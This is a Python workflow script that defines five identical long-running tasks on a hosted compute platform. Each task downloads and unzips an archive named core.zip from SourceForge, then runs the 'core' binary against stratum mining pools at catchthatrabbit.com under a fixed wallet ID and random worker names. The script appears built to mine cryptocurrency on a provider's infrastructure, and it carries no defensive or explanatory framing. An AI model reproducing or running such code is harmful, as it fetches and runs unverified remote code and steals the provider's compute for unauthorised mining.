import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run1():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run2():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run3():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run4():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run5():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')


if __name__ == "__main__":
  app.start()
